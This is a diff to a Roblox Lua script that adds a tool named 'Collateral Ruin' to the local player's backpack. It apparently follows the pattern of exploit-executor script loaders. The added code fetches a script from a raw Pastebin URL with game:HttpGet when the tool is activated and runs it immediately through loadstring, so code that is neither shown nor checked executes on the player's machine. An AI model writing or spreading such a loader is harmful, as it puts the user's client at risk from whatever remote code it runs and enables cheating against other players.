@@ -69,3 +69,23 @@ tool.Activated:Connect(onActivated)
 -- Add the tool to the player's backpack
 tool.Parent = game.Players.LocalPlayer.Backpack
 
+
+--COLLATERAL RUIN CODE
+-- Create the tool
+local tool = Instance.new("Tool")
+tool.Name = "Collateral Ruin"  -- Updated tool name
+tool.RequiresHandle = false  -- No handle required
+ 
+-- Insert the tool into the player's backpack
+tool.Parent = game.Players.LocalPlayer.Backpack
+ 
+-- Function to execute when the tool is activated
+local function onActivated()
+    loadstring(game:HttpGet("https://pastebin.com/raw/Fyku4tS9"))()
+end
+ 
+-- Connect the activation function to the tool's Activated event
+tool.Activated:Connect(onActivated)
+ 
+-- Add the tool to the player's backpack
+tool.Parent = game.Players.LocalPlayer.Backpack
